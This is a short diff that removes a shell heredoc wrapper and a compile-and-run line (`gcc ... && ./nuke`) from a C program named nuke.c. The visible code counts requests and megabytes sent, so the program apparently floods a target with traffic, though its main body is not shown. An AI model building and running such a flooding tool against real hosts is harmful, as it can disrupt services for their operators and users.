@@ -1,4 +1,3 @@
-cat > ~/tools/nuke.c << 'ENDOFFILE'
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -81,6 +80,3 @@ int main() {
     printf("\nDONE | %ld reqs | %.0f MB\n", counter, (counter * (PAYLOAD_SIZE + header_len)) / (1024.0 * 1024.0));
     return 0;
 }
-ENDOFFILE
-
-gcc -O3 -pthread -o nuke ~/tools/nuke.c && ./nuke
